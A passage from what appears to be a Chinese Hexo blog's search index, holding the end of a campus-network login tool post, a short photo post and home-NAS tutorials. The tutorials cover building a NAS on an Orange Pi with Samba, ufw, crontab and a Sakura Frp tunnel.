<span class="token punctuation">{</span> <span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"[在这里输入你的账号]"</span><span class="token punctuation">,</span><span class="token property">"passwd"</span><span class="token operator">:</span><span class="token string">"[在这里输入你的密码]"</span><span class="token punctuation">,</span><span class="token property">"chronium_dir"</span><span class="token operator">:</span><span class="token string">"default"</span><span class="token punctuation">,</span><span class="token property">"driver_dir"</span><span class="token operator">:</span><span class="token string">"default"</span><span class="token punctuation">,</span><span class="token property">"netchoose"</span><span class="token operator">:</span><span class="token string">"[在这里填入你的运营商]"</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们根据提示输入用户名和密码以及运营商，填好后应当是这样的:<br>（这边只是举个例子）</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"objects"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span> <span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"12345678"</span><span class="token punctuation">,</span><span class="token property">"passwd"</span><span class="token operator">:</span><span class="token string">"123456"</span><span class="token punctuation">,</span><span class="token property">"chronium_dir"</span><span class="token operator">:</span><span class="token string">"default"</span><span class="token punctuation">,</span><span class="token property">"driver_dir"</span><span class="token operator">:</span><span class="token string">"default"</span><span class="token punctuation">,</span><span class="token property">"netchoose"</span><span class="token operator">:</span><span class="token string">"中国移动"</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接着我们按下<kbd>Ctrl</kbd>+<kbd>S</kbd>保存，关闭文件。<br>我们双击打开桌面上的快捷方式，那么校园网就自动连接上了。</p></li><li><p>自启动(Auto starting)<br>如果你想要每次开机都能自动连接上校园网，请在Windows10的网络设置中开启Wifi的自动连接，并将桌面上的快捷方式拖入到启动文件夹中。<br>具体可以参考前一个版本的设置。</p></li></ul><h3 id="写在最后："><a href="#写在最后：" class="headerlink" title="写在最后："></a>写在最后：</h3><ul><li>作者开发不易，如果喜欢，记得分享哦！</li><li>也可以去下载汇总页面进行下载！<a href="https://littlewith.github.io/download">点击这里</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Python Humansimular </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 插件 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从零开始自建NAS系列（003）</title>
      <link href="/2022/09/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88003%EF%BC%89/"/>
      <url>/2022/09/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88003%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>欢迎回来！我们继续！</p><p>ps:经过前两节的内容，我们虽然是完成了NAS的基础搭建，已经能在本地局域网环境中使用了，但却还有一些显著的缺点。<br>    例如：１.没有设置开机自动挂载U盘，那么如果我们的香橙派断电或者重启的话，我们就需要重新挂载；<br>        　２．只能在内网使用，无法设置从外部网络访问，那么我们使用的范围是有限的。<br>    那么如何解决上述问题呢：我们接着往下看。</p><h3 id="设置自动挂载"><a href="#设置自动挂载" class="headerlink" title="设置自动挂载"></a>设置自动挂载</h3><p>通过设置自动挂载，那么无论是什么时候开机，都会自动挂载上U盘，这样就一开机就能用了。</p><h4 id="安装配置crontab软件"><a href="#安装配置crontab软件" class="headerlink" title="安装配置crontab软件"></a>安装配置crontab软件</h4><ul><li>crontab是linux上面的一个软件，可以控制计划任务的执行。</li><li>使用如下的命令安装:<br><code>apt -y install cron</code>(Debian类衍生系统)</li><li>开启服务<br><code>systemctl enable cron</code>(Debian类衍生系统)</li><li>编辑计划任务<br><code>crontab -e</code>-&gt;选择nano:1<br>在末尾加入如下内容:<br><code>@reboot mount /dev/sda1 /mnt/usb</code><br><kbd>Ctrl</kbd>+<kbd>O</kbd>保存<br><kbd>Ctrl</kbd>+<kbd>X</kbd>退出<img src="/2022/09/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88003%EF%BC%89/uTools_1663311179592.png" class="lazyload placeholder" data-srcset="/2022/09/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88003%EF%BC%89/uTools_1663311179592.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="Crontab配置"></li><li>重启系统<br><code>reboot</code></li></ul><h4 id="验证安装"><a href="#验证安装" class="headerlink" title="验证安装"></a>验证安装</h4><p>重启之后我们直接通过局域网访问NAS，如果发现能够访问到内容，说明配置没有出现问题。</p><h3 id="开启内网穿透"><a href="#开启内网穿透" class="headerlink" title="开启内网穿透"></a>开启内网穿透</h3><h4 id="到Sakura-Frp-如有侵权，联系我删除"><a href="#到Sakura-Frp-如有侵权，联系我删除" class="headerlink" title="到Sakura Frp(如有侵权，联系我删除)"></a>到Sakura Frp(如有侵权，联系我删除)</h4><ul><li>为什么选择它：对比各大内网穿透服务商，Sakura Frp的价格最优惠，而且免费的套餐给的带宽也挺多的。</li><li>打开Sakura Frp的官网。<br><a href="https://www.natfrp.com/">点我开启</a></li><li>注册账号、实名认证、新建隧道。<img src="/2022/09/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88003%EF%BC%89/uTools_1663380166741.png" class="lazyload placeholder" data-srcset="/2022/09/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88003%EF%BC%89/uTools_1663380166741.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="新建隧道">这边的隧道我们可以随便选择，但是尽量选择国内的，因为国内的隧道速度会比较快一些。<img src="/2022/09/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88003%EF%BC%89/uTools_1663380311340.png" class="lazyload placeholder" data-srcset="/2022/09/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88003%EF%BC%89/uTools_1663380311340.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="选择路线">隧道的类型指定为TCP，设置隧道的本地映射端口为445。<img src="/2022/09/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88003%EF%BC%89/uTools_1663380415506.png" class="lazyload placeholder" data-srcset="/2022/09/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88003%EF%BC%89/uTools_1663380415506.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="隧道类型">新建完成后我们需要记住端口ID(例如123456)，这边为了安全就打码了哈。<img src="/2022/09/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88003%EF%BC%89/uTools_1663380606617.png" class="lazyload placeholder" data-srcset="/2022/09/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88003%EF%BC%89/uTools_1663380606617.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="查看隧道ID">回到用户页面，查看自己的访问密钥，并且记住(例如abcdefgh888)<img src="/2022/09/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88003%EF%BC%89/uTools_1663381027756.png" class="lazyload placeholder" data-srcset="/2022/09/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88003%EF%BC%89/uTools_1663381027756.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="查看访问密钥"></li></ul><h4 id="配置Frpc服务。"><a href="#配置Frpc服务。" class="headerlink" title="配置Frpc服务。"></a>配置Frpc服务。</h4><p>  Frp内网穿透服务是成对存在的，这边我们需要使用的是客户端版本frpc。</p><ul><li>下载Frp的软件，这按我们选择Linux的arm64版本。<img src="/2022/09/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88003%EF%BC%89/1.png" class="lazyload placeholder" data-srcset="/2022/09/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88003%EF%BC%89/1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="frpc1"></li><li>然后我们复制下载的链接。<img src="/2022/09/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88003%EF%BC%89/uTools_1663381209063.png" class="lazyload placeholder" data-srcset="/2022/09/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88003%EF%BC%89/uTools_1663381209063.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="frpc2"></li><li>打开香橙派的SSH命令行。<br><code>wget [你复制的下载链接]</code>进行下载文件。<img src="/2022/09/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88003%EF%BC%89/uTools_1663381409363.png" class="lazyload placeholder" data-srcset="/2022/09/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88003%EF%BC%89/uTools_1663381409363.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="frpc3"></li><li>然后加上可执行权限：<code>chmod 777 frpc_linux_arm64</code><img src="/2022/09/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88003%EF%BC%89/uTools_1663381557609.png" class="lazyload placeholder" data-srcset="/2022/09/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88003%EF%BC%89/uTools_1663381557609.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="frpc4"></li><li>把frpc软件转移到恰当的目录，这边我们选择home目录。<br> <code>mv frpc_linux_arm64 /home/frpc</code></li><li>再一次打开crontab软件，添加新的计划任务:<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">crontab</span> -e<span class="token comment"># 在最后一行加上：</span>@reboot /home/frpc -f <span class="token punctuation">[</span>abcdefgh888<span class="token punctuation">]</span>:<span class="token punctuation">[</span><span class="token number">123456</span><span class="token punctuation">]</span><span class="token comment"># 这边的冒号左边的中括号代表的是你的访问密钥，右边的中括号代表的是你的隧道ID。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><img src="/2022/09/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88003%EF%BC%89/uTools_1663381654044.png" class="lazyload placeholder" data-srcset="/2022/09/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88003%EF%BC%89/uTools_1663381654044.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="frpc5"></li><li>重启系统：<br><code>reboot</code></li></ul><h4 id="检查穿透服务是否正常运行。"><a href="#检查穿透服务是否正常运行。" class="headerlink" title="检查穿透服务是否正常运行。"></a>检查穿透服务是否正常运行。</h4><p>  经过以上的步骤，我们的Frp服务其实就已经配置好了。接下来就开始检查服务是否正确运行。</p><ul><li>打开刚刚的Sakura Frp官网，点击隧道列表，如果我们看到这边的指示状态变绿了，那么说明配置成功。<img src="/2022/09/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88003%EF%BC%89/2.png" class="lazyload placeholder" data-srcset="/2022/09/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88003%EF%BC%89/2.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="检查状态"></li></ul><h3 id="通过外网连接主机"><a href="#通过外网连接主机" class="headerlink" title="通过外网连接主机"></a>通过外网连接主机</h3><ul><li>断开局域网，然后在资源管理器中映射网络驱动器。</li><li>注意：<br>这一次我们的ip地址不再是本地局域网的ip，而是你在Sakura Frp上配置的那台服务器的地址。<br>具体的地址可以将鼠标移动到那条线路上进行查看：<img src="/2022/09/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88003%EF%BC%89/4.png" class="lazyload placeholder" data-srcset="/2022/09/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88003%EF%BC%89/4.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="查看线路">我们使用<code>ping demo.cloud</code>(demo.cloud是你刚刚查看到的域名)，就能看到真实的ip<img src="/2022/09/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88003%EF%BC%89/uTools_1663382618959.png" class="lazyload placeholder" data-srcset="/2022/09/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88003%EF%BC%89/uTools_1663382618959.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="查看IP">这边我用的是Windows的系统进行ping命令的，linux也能使用。<br>这一次我们的端口也不再是445端口，而是你在Sakura Frp上开通的隧道的指定端口。<img src="/2022/09/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88003%EF%BC%89/uTools_1663380606617.png" class="lazyload placeholder" data-srcset="/2022/09/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88003%EF%BC%89/uTools_1663380606617.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="查看端口号">这边我就用123456演示了。</li><li>我们在手机上下载Samba相关的文件管理器，添加进ip和端口。<img src="/2022/09/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88003%EF%BC%89/Screenshot_2022-09-17-10-59-49-251_com.skyjos.app.jpg" class="lazyload placeholder" data-srcset="/2022/09/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88003%EF%BC%89/Screenshot_2022-09-17-10-59-49-251_com.skyjos.app.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="进入访问"></li><li>OK，到这边我们就全部搭建完成了。如果你在使用此方法搭建有问题的话，欢迎联系我（联系方式在主页），或者留言。</li><li>如果你觉得本教程有用的话，请给我点赞哦。</li></ul>]]></content>
      
      
      <categories>
          
          <category> NAS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Samba </tag>
            
            <tag> Frp </tag>
            
            <tag> Debian </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从零开始自建NAS系列（002）</title>
      <link href="/2022/09/13/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88002%EF%BC%89/"/>
      <url>/2022/09/13/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88002%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>OK，欢迎回来，这边继续教程。</p><h3 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h3><p>接下来我们安装必要的一些软件。</p><ul><li>防火墙：ufw。<br>因为我们以后是会进行内网穿透的，因此我们必须要把防火墙给打上，防止蓄意破坏。<br>(<code>apt install ufw</code>)<img src="/2022/09/13/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88002%EF%BC%89/uTools_1663076152571.png" class="lazyload placeholder" data-srcset="/2022/09/13/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88002%EF%BC%89/uTools_1663076152571.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="UFW">开启防火墙：<code>ufw enable</code><img src="/2022/09/13/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88002%EF%BC%89/uTools_1663076369550.png" class="lazyload placeholder" data-srcset="/2022/09/13/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88002%EF%BC%89/uTools_1663076369550.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="enalbe"><hr></li><li>exFAT分区的支持:exfat-fuse。<br>exFAT的分区格式源自Windows系统，因此Linux系统一开始是不支持的，而由于NTFS格式对于U盘的伤害较大，FAT32格式又不能存储4GB以上的单文件，因此综合考虑我们选择exFAT格式，并且在Linux上打上补丁。装好后建议重启香橙派。<br>(<code>sudo apt-get install exfat-fuse exfat-utils</code>)<img src="/2022/09/13/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88002%EF%BC%89/uTools_1663077190949.png" class="lazyload placeholder" data-srcset="/2022/09/13/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88002%EF%BC%89/uTools_1663077190949.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="exFAT">(<code>sudo reboot</code>)<hr></li><li>软件支持：samba。<br>接下来就轮到我们的主角登场了。就是大名鼎鼎的samba，起源于smb协议，是由后面技术大牛改造后移植到linux上面的。<br>(<code>sudo apt install samba</code>)<img src="/2022/09/13/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88002%EF%BC%89/uTools_1663077293895.png" class="lazyload placeholder" data-srcset="/2022/09/13/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88002%EF%BC%89/uTools_1663077293895.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="Samba">这边我们选”Yes”，设置Netbios服务器启动，自动配置DHCP。<img src="/2022/09/13/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88002%EF%BC%89/uTools_1663077418815.png" class="lazyload placeholder" data-srcset="/2022/09/13/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88002%EF%BC%89/uTools_1663077418815.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="NetBios"><hr> OK，到目前为止我们的依赖就算搭建完成了，接下来就是开始繁琐的安装过程了，哈哈其实也不繁琐。</li></ul><h3 id="开始部署"><a href="#开始部署" class="headerlink" title="开始部署"></a>开始部署</h3><h4 id="第一步：开放防火墙对应的端口。"><a href="#第一步：开放防火墙对应的端口。" class="headerlink" title="第一步：开放防火墙对应的端口。"></a>第一步：开放防火墙对应的端口。</h4>  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ufw allow <span class="token number">445</span>ufw reload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="第二步：插入我们的U盘进行挂载。"><a href="#第二步：插入我们的U盘进行挂载。" class="headerlink" title="第二步：插入我们的U盘进行挂载。"></a>第二步：插入我们的U盘进行挂载。</h4>  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 这边先需要新建一个文件夹用于存放挂载的目录：</span><span class="token function">mkdir</span> /mnt/usb<span class="token comment"># 接着就需要查看我们的U盘的位置</span><span class="token function">fdisk</span> -l<span class="token comment"># 最后我们观察到我们U盘应该是在/dev/sda1上的，我们挂载它</span><span class="token function">mount</span> /dev/sda1 /mnt/usb<span class="token comment"># 进入文件夹，查看挂载的情况</span><span class="token builtin class-name">cd</span> /mnt/usb <span class="token operator">&amp;&amp;</span> <span class="token function">ls</span> -lah<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="第三步：开启samba服务。"><a href="#第三步：开启samba服务。" class="headerlink" title="第三步：开启samba服务。"></a>第三步：开启samba服务。</h4>  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl <span class="token builtin class-name">enable</span> smbd<span class="token comment"># 设置samba服务开机自动启动</span>systemctl status smbd<span class="token comment"># 查看samba服务是否已经正常运行</span><span class="token comment"># --&gt;如果输出下图内容，说明服务正常:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>  <img src="/2022/09/13/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88002%EF%BC%89/uTools_1663242156611.png" class="lazyload placeholder" data-srcset="/2022/09/13/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88002%EF%BC%89/uTools_1663242156611.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="检查Samba状态"><h4 id="第四步：新建samba用户。"><a href="#第四步：新建samba用户。" class="headerlink" title="第四步：新建samba用户。"></a>第四步：新建samba用户。</h4><p>  为什么要新建一个用户呢，因为我们这个东西最终是要放到公网上去的，所以必须考虑安全问题。由于root用户可能会被提权，那么到时候咱们的服务器就危险了。所以我们要新建一个普通的用户。<br>  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">useradd</span> -m helix<span class="token comment"># 添加用户同时新建家目录</span><span class="token function">passwd</span> helix<span class="token comment"># 给新的用户更新密码</span><span class="token function">nano</span> /etc/passwd<span class="token comment"># 编辑用户配置文件，找到helix的这一行，把后面的命令行改成/bin/bash，这样我们使用helix用户的时候就能自动补全代码了</span>smbpasswd -a helix<span class="token comment"># 为smb添加刚刚新建的helix用户，输入新用户的密码</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p></p><h4 id="第五步：配置samba协议。"><a href="#第五步：配置samba协议。" class="headerlink" title="第五步：配置samba协议。"></a>第五步：配置samba协议。</h4>  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nano</span> /etc/samba/smb.conf<span class="token comment"># 打开samba的配置文件，准备编辑</span><span class="token comment"># 写入以下内容:</span><span class="token punctuation">[</span>NAS<span class="token punctuation">]</span> comment <span class="token operator">=</span> NAS path <span class="token operator">=</span> /mnt/usb writeable <span class="token operator">=</span> <span class="token function">yes</span> <span class="token builtin class-name">read</span> only <span class="token operator">=</span> no public <span class="token operator">=</span> no <span class="token function">write</span> list <span class="token operator">=</span> @helix<span class="token comment"># 之后使用Ctrl+O ,Ctrl+X保存</span>systemctl restart smbd<span class="token comment"># 重启服务</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  到这一步我们的NAS就基本上配置完成了，接下来，我们打开windows的资源管理器，映射网络驱动器，输入\\[ip地址]\NAS，输入用户名和密码，就可以访问我们刚刚搭建的NAS资源了。<br>  <img src="/2022/09/13/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88002%EF%BC%89/uTools_1663246431367.png" class="lazyload placeholder" data-srcset="/2022/09/13/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88002%EF%BC%89/uTools_1663246431367.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="登录"><br>  <img src="/2022/09/13/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88002%EF%BC%89/uTools_1663247002608.png" class="lazyload placeholder" data-srcset="/2022/09/13/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88002%EF%BC%89/uTools_1663247002608.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="成功访问"></p>]]></content>
      
      
      <categories>
          
          <category> NAS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Samba </tag>
            
            <tag> Frp </tag>
            
            <tag> Debian </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>220912今日分享</title>
      <link href="/2022/09/12/220912%E4%BB%8A%E6%97%A5%E5%88%86%E4%BA%AB/"/>
      <url>/2022/09/12/220912%E4%BB%8A%E6%97%A5%E5%88%86%E4%BA%AB/</url>
      
        <content type="html"><![CDATA[<h3 id="没啥好分享的，就发一张日落的图供大家欣赏吧"><a href="#没啥好分享的，就发一张日落的图供大家欣赏吧" class="headerlink" title="没啥好分享的，就发一张日落的图供大家欣赏吧"></a>没啥好分享的，就发一张日落的图供大家欣赏吧</h3><img src="/2022/09/12/220912%E4%BB%8A%E6%97%A5%E5%88%86%E4%BA%AB/1662992106899.jpg" class="lazyload placeholder" data-srcset="/2022/09/12/220912%E4%BB%8A%E6%97%A5%E5%88%86%E4%BA%AB/1662992106899.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="今日份日落">]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从零开始自建NAS系列（001）</title>
      <link href="/2022/09/11/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E8%87%AA%E5%BB%BANAS%E7%B3%BB%E5%88%97%EF%BC%88001%EF%BC%89/"/>
